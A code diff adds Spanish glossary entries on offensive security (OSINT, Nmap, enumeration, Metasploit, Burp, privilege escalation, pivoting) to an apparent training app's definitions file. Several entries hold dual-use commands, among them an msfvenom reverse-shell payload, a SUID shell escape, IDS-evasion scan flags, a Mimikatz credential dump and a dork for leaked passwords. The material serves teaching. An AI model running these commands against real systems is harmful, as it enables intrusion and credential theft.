@@ -1888,6 +1888,573 @@ export const DEFINITIONS: ConceptDefinition[] = [
     ],
     related: ["SSRF y metadata cloud", "Injection", "Hardening y CIS Benchmarks"],
   },
+
+  // ── M25 · Reconocimiento y OSINT ─────────────────────────────────────────
+  {
+    id: 280,
+    module: 25,
+    term: "Reconocimiento pasivo vs activo",
+    short: "El pasivo no toca al objetivo; el activo interactúa y deja huella.",
+    detail:
+      "El **reconocimiento** es la primera fase de cualquier pentest:\n" +
+      "| Tipo | Interacción | Detección |\n" +
+      "|---|---|---|\n" +
+      "| Pasivo | Solo fuentes públicas (OSINT) | Indetectable |\n" +
+      "| Activo | Toca el objetivo (escaneo, conexión) | Puede alertar al IDS |\n" +
+      "> 💡 Se empieza por el pasivo para construir el mapa del objetivo sin hacer ruido, y solo después se pasa al activo.",
+    examples: [
+      "Buscar empleados en LinkedIn (pasivo).",
+      "Un ping o escaneo de puertos ya es activo.",
+    ],
+    related: ["Google dorking", "Shodan y Censys", "Frameworks OSINT"],
+  },
+  {
+    id: 281,
+    module: 25,
+    term: "Google dorking",
+    short: "Usar operadores de búsqueda avanzados para encontrar información expuesta.",
+    detail:
+      "El **Google dorking** (*Google hacking*) aprovecha operadores para hallar datos sensibles indexados: paneles de login, archivos, errores.\n" +
+      "site:ejemplo.com filetype:pdf\n" +
+      "intitle:\"index of\" \"backup\"\n" +
+      "> 💡 La **Google Hacking Database (GHDB)** de Exploit-DB recopila dorks útiles.",
+    examples: [
+      "site:target.com -www para descubrir subdominios.",
+      "filetype:env DB_PASSWORD para buscar secretos filtrados.",
+    ],
+    related: ["Reconocimiento pasivo vs activo", "Shodan y Censys", "OSINT"],
+  },
+  {
+    id: 282,
+    module: 25,
+    term: "Shodan y Censys",
+    short: "Buscadores de dispositivos conectados a Internet, no de páginas web.",
+    detail:
+      "**Shodan** y **Censys** indexan **hosts y servicios** expuestos (puertos, banners, certificados, cámaras, ICS), no contenido web. Permiten encontrar la superficie de ataque de una organización sin tocarla (recon pasivo).",
+    examples: [
+      "Buscar en Shodan servidores RDP expuestos de una organización.",
+      "Censys para enumerar certificados y subdominios de un dominio.",
+    ],
+    related: ["Google dorking", "Reconocimiento pasivo vs activo", "Superficie de ataque"],
+  },
+  {
+    id: 283,
+    module: 25,
+    term: "Frameworks OSINT",
+    short: "Herramientas que automatizan la recolección y correlación de inteligencia abierta.",
+    detail:
+      "Más allá de búsquedas manuales, hay herramientas dedicadas:\n" +
+      "• **theHarvester** — correos, subdominios y hosts de fuentes públicas.\n" +
+      "• **Maltego** — correlación visual de relaciones (personas, dominios, infra).\n" +
+      "• **Recon-ng / SpiderFoot** — frameworks modulares de automatización OSINT.\n" +
+      "theHarvester -d ejemplo.com -b all",
+    examples: [
+      "theHarvester reuniendo correos para un phishing dirigido.",
+      "Maltego graficando la infraestructura de un objetivo.",
+    ],
+    related: ["OSINT", "Reconocimiento pasivo vs activo", "Shodan y Censys"],
+  },
+
+  // ── M26 · Escaneo con Nmap ───────────────────────────────────────────────
+  {
+    id: 290,
+    module: 26,
+    term: "Tipos de escaneo Nmap",
+    short: "SYN, TCP connect y UDP: distintas formas de descubrir puertos según sigilo y permisos.",
+    detail:
+      "**Nmap** descubre puertos abiertos con distintas técnicas:\n" +
+      "| Flag | Tipo | Nota |\n" +
+      "|---|---|---|\n" +
+      "| -sS | SYN (half-open) | Rápido y sigiloso (requiere root) |\n" +
+      "| -sT | TCP connect | Completa el handshake (sin root) |\n" +
+      "| -sU | UDP | Lento; descubre DNS, SNMP, etc. |\n" +
+      "nmap -sS -p- 10.0.0.5\n" +
+      "> 💡 `-p-` escanea los 65535 puertos; sin él, Nmap prueba los 1000 más comunes.",
+    examples: [
+      "nmap -sS -sV -p- objetivo para puertos + versiones.",
+      "No olvidar -sU: muchos servicios viven en UDP.",
+    ],
+    related: ["NSE scripts", "Detección de servicio y OS", "Three-way handshake"],
+  },
+  {
+    id: 291,
+    module: 26,
+    term: "NSE scripts",
+    short: "El motor de scripting de Nmap automatiza detección de vulns, enum y más.",
+    detail:
+      "El **NSE** (*Nmap Scripting Engine*) extiende Nmap con scripts (en Lua) para enumeración, detección de vulnerabilidades y hasta explotación ligera. Se agrupan en categorías (`default`, `safe`, `vuln`).\n" +
+      "nmap --script vuln 10.0.0.5\n" +
+      "> ⚠️ La categoría `vuln`/`exploit` es intrusiva: solo con autorización.",
+    examples: [
+      "nmap --script smb-enum-shares para listar shares SMB.",
+      "nmap -sC ejecuta los scripts por defecto.",
+    ],
+    related: ["Tipos de escaneo Nmap", "Detección de servicio y OS", "Enumeración SMB y NetBIOS"],
+  },
+  {
+    id: 292,
+    module: 26,
+    term: "Detección de servicio y OS",
+    short: "Nmap identifica qué versión de servicio corre y qué sistema operativo es el host.",
+    detail:
+      "Con **-sV** Nmap hace *banner grabbing* y fingerprinting para deducir el **servicio y versión** de cada puerto; con **-O**, el **sistema operativo** por las peculiaridades de su pila TCP/IP. Saber la versión exacta es clave para buscar CVEs aplicables.",
+    examples: [
+      "nmap -sV revela 'Apache 2.4.49' (con CVE conocida).",
+      "nmap -O estima Linux 5.x vs Windows Server.",
+    ],
+    related: ["Tipos de escaneo Nmap", "Análisis de vulnerabilidades", "CVE y CVSS"],
+  },
+  {
+    id: 293,
+    module: 26,
+    term: "Evasión de IDS/firewall",
+    short: "Técnicas para escanear sin disparar las defensas del objetivo.",
+    detail:
+      "Nmap ofrece opciones para evadir detección: **fragmentación** (`-f`), **timing lento** (`-T1/-T2`), **señuelos** (`-D`) que mezclan IPs falsas, y cambiar el **puerto de origen**.\n" +
+      "nmap -sS -T2 -f -D RND:5 objetivo\n" +
+      "> ⚠️ Ningún método es infalible contra un IDS moderno; reducen pero no eliminan la huella.",
+    examples: [
+      "-T2 para un escaneo lento que no destaca en los logs.",
+      "-D para esconder la IP real entre señuelos.",
+    ],
+    related: ["Tipos de escaneo Nmap", "Detección de anomalías en tráfico", "Reconocimiento pasivo vs activo"],
+  },
+
+  // ── M27 · Enumeración de Servicios ───────────────────────────────────────
+  {
+    id: 300,
+    module: 27,
+    term: "Enumeración SMB y NetBIOS",
+    short: "SMB suele filtrar shares, usuarios y políticas; un clásico punto de entrada.",
+    detail:
+      "**SMB** (puertos 445/139) es una mina de información en redes Windows: shares accesibles, usuarios, políticas de contraseña. Herramientas: **enum4linux**, **smbclient**, **crackmapexec**.\n" +
+      "enum4linux -a 10.0.0.10\n" +
+      "> ⚠️ Shares con **null session** (sin credenciales) son hallazgos frecuentes y graves.",
+    examples: [
+      "smbclient -L //10.0.0.10 lista los shares.",
+      "crackmapexec smb para spray de credenciales en la red.",
+    ],
+    related: ["Herramientas de enumeración", "DNS zone transfer", "Active Directory: dominio, bosque y OU"],
+  },
+  {
+    id: 301,
+    module: 27,
+    term: "DNS zone transfer",
+    short: "Un servidor DNS mal configurado entrega todos sus registros de golpe.",
+    detail:
+      "Una **transferencia de zona (AXFR)** está pensada para replicar entre servidores DNS, pero si está abierta a cualquiera, revela **todo el mapa interno** (hostnames, IPs, subdominios).\n" +
+      "dig axfr ejemplo.com @ns1.ejemplo.com\n" +
+      "> 💡 Es de los primeros checks de enumeración: regala el inventario de la red.",
+    examples: [
+      "Un AXFR exitoso lista servidores internos no públicos.",
+      "Mitigación: restringir AXFR a IPs de servidores secundarios.",
+    ],
+    related: ["DNS", "Enumeración SMB y NetBIOS", "Enumeración SNMP y LDAP"],
+  },
+  {
+    id: 302,
+    module: 27,
+    term: "Enumeración SNMP y LDAP",
+    short: "SNMP y LDAP exponen inventario de dispositivos y estructura del directorio.",
+    detail:
+      "• **SNMP** (UDP/161) con la *community string* por defecto (`public`) filtra interfaces, procesos y rutas.\n" +
+      "• **LDAP** (389/636) permite enumerar usuarios, grupos y la estructura de Active Directory.\n" +
+      "snmpwalk -v2c -c public 10.0.0.20\n" +
+      "ldapsearch -x -h 10.0.0.10 -b \"dc=corp,dc=local\"",
+    examples: [
+      "snmpwalk con community 'public' lista la config del router.",
+      "ldapsearch enumera cuentas del dominio.",
+    ],
+    related: ["Enumeración SMB y NetBIOS", "LDAP", "Herramientas de enumeración"],
+  },
+  {
+    id: 303,
+    module: 27,
+    term: "Herramientas de enumeración",
+    short: "enum4linux, rpcclient, gobuster, nikto: el arsenal para sonsacar servicios.",
+    detail:
+      "Cada protocolo tiene su herramienta:\n" +
+      "• **enum4linux / rpcclient** — SMB/MSRPC (usuarios, shares).\n" +
+      "• **gobuster / ffuf** — fuzzing de directorios y subdominios web.\n" +
+      "• **nikto** — escáner de problemas web conocidos.\n" +
+      "• **crackmapexec** — enumeración y spray en redes AD.\n" +
+      "gobuster dir -u http://10.0.0.5 -w wordlist.txt",
+    examples: [
+      "gobuster descubriendo /admin oculto.",
+      "rpcclient -U '' para una sesión nula contra SMB.",
+    ],
+    related: ["Enumeración SMB y NetBIOS", "Enumeración SNMP y LDAP", "Análisis de vulnerabilidades"],
+  },
+
+  // ── M28 · Análisis de Vulnerabilidades ───────────────────────────────────
+  {
+    id: 310,
+    module: 28,
+    term: "Escáneres de vulnerabilidades",
+    short: "Nessus, OpenVAS y nuclei automatizan la detección de fallos conocidos.",
+    detail:
+      "Un **escáner de vulnerabilidades** compara servicios/versiones contra bases de CVEs:\n" +
+      "| Herramienta | Nota |\n" +
+      "|---|---|\n" +
+      "| Nessus | Comercial, muy completo |\n" +
+      "| OpenVAS | Open source |\n" +
+      "| nuclei | Basado en plantillas, rápido, CI-friendly |\n" +
+      "> ⚠️ Generan **falsos positivos**: hay que validar manualmente antes de reportar.",
+    examples: [
+      "nuclei -u https://target con plantillas comunitarias.",
+      "Un escaneo Nessus autenticado para mayor profundidad.",
+    ],
+    related: ["CVE y CVSS", "Análisis de vulnerabilidades", "Detección de servicio y OS"],
+  },
+  {
+    id: 311,
+    module: 28,
+    term: "Análisis de vulnerabilidades",
+    short: "No es solo escanear: es validar, contextualizar y priorizar los hallazgos.",
+    detail:
+      "Un **vulnerability assessment** identifica y clasifica debilidades, pero a diferencia de un **pentest** no necesariamente las explota. El valor está en **validar** (descartar falsos positivos), **contextualizar** (¿es alcanzable? ¿qué expone?) y **priorizar** la remediación.",
+    examples: [
+      "Confirmar manualmente que una vuln reportada es real.",
+      "Diferenciar un assessment (amplio) de un pentest (profundo).",
+    ],
+    related: ["Escáneres de vulnerabilidades", "Priorización de remediación", "Gestión de riesgos"],
+  },
+  {
+    id: 312,
+    module: 28,
+    term: "Priorización de remediación",
+    short: "Arreglar primero lo crítico y explotable, no todo a la vez.",
+    detail:
+      "No todo se parchea a la vez. Se prioriza combinando **CVSS** (severidad), **explotabilidad real** (¿hay exploit público? ¿está en la **CISA KEV**?) y **exposición/contexto** (¿es alcanzable desde Internet?).\n" +
+      "> 💡 Una CVSS 9.8 expuesta a Internet y en KEV va primero que una 9.0 interna sin exploit conocido.",
+    examples: [
+      "Priorizar una CVE en la lista KEV de CISA.",
+      "Posponer una vuln alta pero inalcanzable tras la red interna.",
+    ],
+    related: ["CVE y CVSS", "Análisis de vulnerabilidades", "Gestión de riesgos"],
+  },
+  {
+    id: 313,
+    module: 28,
+    term: "Assessment vs pentest",
+    short: "El assessment lista y prioriza vulnerabilidades; el pentest las explota para demostrar impacto.",
+    detail:
+      "Dos servicios que se confunden:\n" +
+      "• **Vulnerability assessment** — amplio, automatizado, sin explotar; responde '¿qué fallos tengo?'.\n" +
+      "• **Penetration test** — profundo, manual, explota y encadena; responde '¿qué puede lograr un atacante real?'.\n" +
+      "Un **red team** va más allá: simula un adversario con objetivos y sigilo.",
+    examples: [
+      "Assessment trimestral + pentest anual como combinación típica.",
+      "Un pentest demuestra el impacto encadenando vulnerabilidades.",
+    ],
+    related: ["Análisis de vulnerabilidades", "Metodología de un pentest", "Red Team / Ofensiva"],
+  },
+
+  // ── M29 · Metasploit Framework ───────────────────────────────────────────
+  {
+    id: 320,
+    module: 29,
+    term: "Arquitectura de Metasploit",
+    short: "El framework organiza exploits, payloads y módulos auxiliares bajo msfconsole.",
+    detail:
+      "**Metasploit** es el framework de explotación de referencia. Sus piezas:\n" +
+      "• **Exploit** — código que aprovecha una vulnerabilidad.\n" +
+      "• **Payload** — lo que se ejecuta tras explotar (shell, Meterpreter).\n" +
+      "• **Auxiliary** — escáneres, fuzzers, módulos sin payload.\n" +
+      "• **Encoder / NOP** — para evasión.\n" +
+      "Todo se maneja desde **msfconsole**.",
+    examples: [
+      "search type:exploit smb para encontrar módulos.",
+      "Un módulo auxiliary para hacer brute force de SSH.",
+    ],
+    related: ["Payloads y Meterpreter", "Flujo de explotación con Metasploit", "Exploit y Payload"],
+  },
+  {
+    id: 321,
+    module: 29,
+    term: "Payloads y Meterpreter",
+    short: "El payload es lo que corre tras el exploit; Meterpreter es el más potente.",
+    detail:
+      "Los payloads pueden ser **staged** (se envían en partes, más sigilosos) o **stageless** (un solo bloque). **Meterpreter** es un payload avanzado en memoria que ofrece migración de procesos, captura de teclas, pivoting y más, sin tocar disco.\n" +
+      "> 💡 `windows/x64/meterpreter/reverse_tcp` es un payload staged clásico.",
+    examples: [
+      "getsystem en Meterpreter intenta escalar a SYSTEM.",
+      "migrate para moverse a un proceso más estable.",
+    ],
+    related: ["Arquitectura de Metasploit", "Post-explotación", "Exploit y Payload"],
+  },
+  {
+    id: 322,
+    module: 29,
+    term: "Post-explotación",
+    short: "Lo que se hace tras ganar acceso: persistir, recolectar y pivotar.",
+    detail:
+      "Conseguir una shell es el principio. La **post-explotación** abarca: **escalar privilegios**, **recolectar credenciales/datos**, **mantener persistencia** y **pivotar** hacia otras máquinas. Es donde se materializa el impacto real de un compromiso.",
+    examples: [
+      "Volcar hashes con hashdump tras escalar.",
+      "Usar la máquina comprometida como pivote a la red interna.",
+    ],
+    related: ["Payloads y Meterpreter", "Escalada de privilegios en Linux", "Pivoting y movimiento lateral"],
+  },
+  {
+    id: 323,
+    module: 29,
+    term: "msfvenom",
+    short: "El generador de payloads independientes de Metasploit.",
+    detail:
+      "**msfvenom** crea payloads autónomos (ejecutables, scripts, shellcode) para usar fuera de un exploit de Metasploit, con codificación opcional para evasión.\n" +
+      "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe\n" +
+      "> ⚠️ Los payloads sin ofuscar los detecta cualquier AV moderno.",
+    examples: [
+      "Generar un .exe con reverse shell para un laboratorio.",
+      "Crear shellcode para inyectar en un exploit propio.",
+    ],
+    related: ["Payloads y Meterpreter", "Arquitectura de Metasploit", "PowerShell ofensivo"],
+  },
+
+  // ── M30 · Burp Suite ─────────────────────────────────────────────────────
+  {
+    id: 330,
+    module: 30,
+    term: "Proxy e intercept",
+    short: "Burp se sitúa entre el navegador y el servidor para ver y modificar cada petición.",
+    detail:
+      "El corazón de **Burp Suite** es su **proxy**: configurando el navegador para pasar por Burp, se **interceptan**, inspeccionan y **modifican** las peticiones HTTP/S al vuelo. Es la base de todo testing web manual.\n" +
+      "> 💡 Requiere instalar el certificado CA de Burp en el navegador para ver el tráfico HTTPS.",
+    examples: [
+      "Interceptar un POST de login y alterar parámetros.",
+      "Ver el tráfico oculto que hace el JavaScript de una SPA.",
+    ],
+    related: ["Repeater", "Intruder", "Scanner y extensiones"],
+  },
+  {
+    id: 331,
+    module: 30,
+    term: "Repeater",
+    short: "Reenvía y modifica una petición manualmente cuantas veces haga falta.",
+    detail:
+      "**Repeater** permite tomar una petición, **editarla y reenviarla** repetidamente para probar manualmente cómo responde el servidor. Es la herramienta clave para explorar vulnerabilidades (probar payloads de SQLi/XSS, manipular tokens) con precisión.",
+    examples: [
+      "Probar distintos payloads de SQLi en un parámetro.",
+      "Manipular un id para verificar un IDOR.",
+    ],
+    related: ["Proxy e intercept", "Intruder", "SQL Injection"],
+  },
+  {
+    id: 332,
+    module: 30,
+    term: "Intruder",
+    short: "Automatiza el envío de muchas peticiones con payloads variables (fuzzing, brute force).",
+    detail:
+      "**Intruder** automatiza ataques sobre posiciones marcadas de una petición: **fuzzing** de parámetros, **fuerza bruta** de credenciales, enumeración. Define payloads y analiza las respuestas (longitud, código) para detectar anomalías.\n" +
+      "> 💡 La versión Community de Burp limita la velocidad de Intruder; las Pro no.",
+    examples: [
+      "Brute force de un login con una lista de contraseñas.",
+      "Fuzzear un parámetro para descubrir valores válidos.",
+    ],
+    related: ["Repeater", "Proxy e intercept", "Identification and Authentication Failures"],
+  },
+  {
+    id: 333,
+    module: 30,
+    term: "Scanner y extensiones",
+    short: "El escáner automático de Burp Pro y el ecosistema de extensiones BApp.",
+    detail:
+      "Burp **Pro** incluye un **Scanner** que detecta automáticamente vulnerabilidades comunes (XSS, SQLi, etc.). El **BApp Store** añade extensiones (Logger++, Autorize para IDOR, Active Scan++) que potencian el flujo. La filosofía: automatizar lo repetitivo, validar a mano lo crítico.",
+    examples: [
+      "Autorize para detectar fallos de control de acceso.",
+      "Active Scan++ para ampliar la cobertura del scanner.",
+    ],
+    related: ["Proxy e intercept", "Escáneres de vulnerabilidades", "OWASP Top 10"],
+  },
+
+  // ── M31 · Escalada de Privilegios: Linux ─────────────────────────────────
+  {
+    id: 340,
+    module: 31,
+    term: "Enumeración local (LinPEAS)",
+    short: "El primer paso de la escalada: mapear el sistema en busca de vectores.",
+    detail:
+      "Antes de escalar hay que **enumerar** el sistema: versión del kernel, binarios SUID, permisos sudo, tareas cron, archivos world-writable, credenciales. Herramientas como **LinPEAS** y **LinEnum** automatizan este barrido y resaltan los hallazgos.\n" +
+      "sudo -l\n" +
+      "find / -perm -4000 2>/dev/null",
+    examples: [
+      "Ejecutar LinPEAS y revisar lo marcado en rojo/amarillo.",
+      "sudo -l para ver qué se puede correr como root.",
+    ],
+    related: ["SUID/SGID abuse", "Sudo, cron y PATH hijacking", "Bits especiales SUID/SGID"],
+  },
+  {
+    id: 341,
+    module: 31,
+    term: "SUID/SGID abuse",
+    short: "Binarios SUID mal elegidos permiten ejecutar como root.",
+    detail:
+      "Un binario **SUID root** corre con privilegios de root sin importar quién lo lance. Si es un binario que permite ejecutar comandos o leer archivos (ej. `find`, `vim`, `nmap` viejo), se abusa para escalar. **GTFOBins** cataloga cómo explotar cada uno.\n" +
+      "find . -exec /bin/sh -p \\; -quit\n" +
+      "> 💡 GTFOBins es la referencia para 'romper' un binario SUID/sudo concreto.",
+    examples: [
+      "Un find SUID que lanza una shell de root.",
+      "Consultar GTFOBins para el binario SUID hallado.",
+    ],
+    related: ["Enumeración local (LinPEAS)", "Bits especiales SUID/SGID", "Sudo, cron y PATH hijacking"],
+  },
+  {
+    id: 342,
+    module: 31,
+    term: "Sudo, cron y PATH hijacking",
+    short: "Reglas sudo laxas, cron jobs y un PATH manipulable abren caminos a root.",
+    detail:
+      "Vectores muy comunes:\n" +
+      "• **sudo** mal configurado — un comando permitido que se 'rompe' (GTFOBins) o `NOPASSWD` amplio.\n" +
+      "• **cron jobs** — tareas de root que ejecutan scripts modificables o con comodines.\n" +
+      "• **PATH hijacking** — si un script privilegiado llama a un binario sin ruta absoluta, se coloca uno malicioso antes en el PATH.",
+    examples: [
+      "Un cron de root corriendo un script world-writable.",
+      "Inyectar un binario falso en el PATH de un script SUID.",
+    ],
+    related: ["SUID/SGID abuse", "Enumeración local (LinPEAS)", "Kernel exploits y capabilities"],
+  },
+  {
+    id: 343,
+    module: 31,
+    term: "Kernel exploits y capabilities",
+    short: "Un kernel viejo o capabilities mal asignadas también dan root.",
+    detail:
+      "• **Kernel exploits** — un kernel sin parchear puede tener una vuln de escalada local (ej. Dirty COW, Dirty Pipe). Potentes pero arriesgados (pueden tumbar el sistema).\n" +
+      "• **Capabilities** — permisos granulares de Linux; una mal asignada (ej. `cap_setuid` en un binario) equivale a root.\n" +
+      "getcap -r / 2>/dev/null",
+    examples: [
+      "Dirty Pipe (2022) para escalar en kernels vulnerables.",
+      "Un Python con cap_setuid+ep que da una shell de root.",
+    ],
+    related: ["Sudo, cron y PATH hijacking", "Vulnerable and Outdated Components", "Enumeración local (LinPEAS)"],
+  },
+
+  // ── M32 · Escalada de Privilegios: Windows ───────────────────────────────
+  {
+    id: 350,
+    module: 32,
+    term: "Enumeración (WinPEAS/PowerUp)",
+    short: "Mapear el host Windows en busca de misconfiguraciones que escalen a SYSTEM.",
+    detail:
+      "Como en Linux, la escalada empieza enumerando: privilegios del token, servicios, parches faltantes, credenciales guardadas. **WinPEAS** (y **PowerUp** en PowerShell) automatizan la búsqueda de vectores.\n" +
+      "whoami /priv\n" +
+      "> 💡 `whoami /priv` revela privilegios abusables como SeImpersonatePrivilege (puerta a los ataques Potato).",
+    examples: [
+      "WinPEAS resaltando un servicio con permisos débiles.",
+      "PowerUp's Invoke-AllChecks para un barrido rápido.",
+    ],
+    related: ["Token impersonation y Potato", "Servicios vulnerables", "Defender, AMSI y ETW"],
+  },
+  {
+    id: 351,
+    module: 32,
+    term: "Token impersonation y Potato",
+    short: "Abusar de SeImpersonatePrivilege para suplantar el token de SYSTEM.",
+    detail:
+      "Si una cuenta de servicio tiene **SeImpersonatePrivilege**, la familia de ataques **Potato** (JuicyPotato, RoguePotato, PrintSpoofer) la usa para **suplantar el token de SYSTEM** y escalar. Es uno de los caminos más comunes desde un servicio web/SQL comprometido.",
+    examples: [
+      "PrintSpoofer convirtiendo SeImpersonate en SYSTEM.",
+      "JuicyPotato en versiones de Windows más antiguas.",
+    ],
+    related: ["Enumeración (WinPEAS/PowerUp)", "Servicios vulnerables", "Servicios y procesos"],
+  },
+  {
+    id: 352,
+    module: 32,
+    term: "Servicios vulnerables",
+    short: "Rutas sin comillas, permisos débiles y AlwaysInstallElevated permiten escalar.",
+    detail:
+      "Misconfiguraciones de servicios muy explotadas:\n" +
+      "• **Unquoted service path** — una ruta con espacios sin comillas permite colocar un binario malicioso que se ejecuta como SYSTEM.\n" +
+      "• **Permisos débiles** — poder modificar el binario o la config de un servicio.\n" +
+      "• **AlwaysInstallElevated** — instala MSIs como SYSTEM.\n" +
+      "• **DLL hijacking** — colocar una DLL que el servicio carga.",
+    examples: [
+      "C:\\Program Files\\app vuln.exe → plantar 'Program.exe'.",
+      "AlwaysInstallElevated habilitado → MSI malicioso como SYSTEM.",
+    ],
+    related: ["Token impersonation y Potato", "Enumeración (WinPEAS/PowerUp)", "Servicios y procesos"],
+  },
+  {
+    id: 353,
+    module: 32,
+    term: "Mimikatz y robo de credenciales",
+    short: "Volcar contraseñas, hashes y tickets de la memoria de Windows.",
+    detail:
+      "Tras escalar a admin/SYSTEM, **Mimikatz** vuelca credenciales de la memoria de **LSASS**: contraseñas en claro, hashes NTLM y tickets Kerberos. Habilita **Pass-the-Hash** y **Golden Ticket** para el movimiento lateral.\n" +
+      "> 💡 **Credential Guard** y proteger LSASS dificultan estos volcados.",
+    examples: [
+      "sekurlsa::logonpasswords para volcar credenciales.",
+      "Robar un hash NTLM para Pass-the-Hash a otra máquina.",
+    ],
+    related: ["Token impersonation y Potato", "Ataques a Active Directory", "Pivoting y movimiento lateral"],
+  },
+
+  // ── M33 · Pivoting y Movimiento Lateral ──────────────────────────────────
+  {
+    id: 360,
+    module: 33,
+    term: "Port forwarding y túneles",
+    short: "Redirigir puertos a través de una máquina comprometida para alcanzar la red interna.",
+    detail:
+      "El **port forwarding** usa un host comprometido como **puente** hacia servicios internos no accesibles directamente. Con **SSH** se hacen túneles **local** (`-L`), **remoto** (`-R`) y **dinámico/SOCKS** (`-D`).\n" +
+      "ssh -L 8080:10.0.0.50:80 user@pivote\n" +
+      "> 💡 El túnel dinámico (-D) + proxychains permite enrutar herramientas enteras por el pivote.",
+    examples: [
+      "Acceder a una intranet 10.x vía un -L a través del pivote.",
+      "ssh -D 1080 + proxychains nmap para escanear la red interna.",
+    ],
+    related: ["Túneles con chisel y ligolo", "Movimiento lateral", "Streams y redirección"],
+  },
+  {
+    id: 361,
+    module: 33,
+    term: "Túneles con chisel y ligolo",
+    short: "Herramientas modernas para tunelizar cuando no hay SSH disponible.",
+    detail:
+      "Cuando el pivote no tiene SSH (típico en Windows), se usan herramientas dedicadas:\n" +
+      "• **chisel** — túnel TCP/UDP sobre HTTP, cliente-servidor.\n" +
+      "• **ligolo-ng** — crea una interfaz de red hacia la red interna, muy cómodo.\n" +
+      "• **sshuttle** — 'VPN pobre' sobre SSH para subredes enteras.\n" +
+      "> 💡 ligolo-ng evita el dolor de cadenas de port-forwards manuales.",
+    examples: [
+      "chisel para tunelizar desde un Windows comprometido.",
+      "ligolo-ng para enrutar toda una subred interna.",
+    ],
+    related: ["Port forwarding y túneles", "Movimiento lateral", "VPN: IPSec vs WireGuard"],
+  },
+  {
+    id: 362,
+    module: 33,
+    term: "Movimiento lateral",
+    short: "Saltar de una máquina a otra dentro de la red usando credenciales y protocolos legítimos.",
+    detail:
+      "El **movimiento lateral** expande el compromiso por la red usando técnicas que abusan de funciones legítimas: **PsExec**, **WMI**, **WinRM**, **RDP** y **Pass-the-Hash** (autenticarse con el hash sin la contraseña). El objetivo final suele ser el **Domain Admin** / Domain Controller.",
+    examples: [
+      "psexec.py con un hash robado para una shell en otro host.",
+      "WinRM (evil-winrm) para moverse con credenciales válidas.",
+    ],
+    related: ["Túneles con chisel y ligolo", "Mimikatz y robo de credenciales", "Ataques a Active Directory"],
+  },
+  {
+    id: 363,
+    module: 33,
+    term: "Defensa contra el movimiento lateral",
+    short: "Segmentación, mínimo privilegio y monitoreo contienen al atacante interno.",
+    detail:
+      "Una vez dentro, el atacante busca expandirse; las defensas lo **contienen**:\n" +
+      "• **Microsegmentación** — separar la red para que un host no llegue a todos.\n" +
+      "• **Mínimo privilegio + LAPS** — limitar dónde sirve una credencial robada.\n" +
+      "• **Deshabilitar SMBv1 / restringir RDP** — cerrar vías clásicas.\n" +
+      "• **Monitoreo** — detectar uso anómalo de cuentas y herramientas (PsExec).",
+    examples: [
+      "Segmentar para que un PC de oficina no alcance los servidores.",
+      "LAPS para que cada equipo tenga una contraseña local distinta.",
+    ],
+    related: ["Movimiento lateral", "Defensa en profundidad", "DMZ y segmentación de red"],
+  },
 ];
 
 export function definitionsByModule(moduleId: number): ConceptDefinition[] {
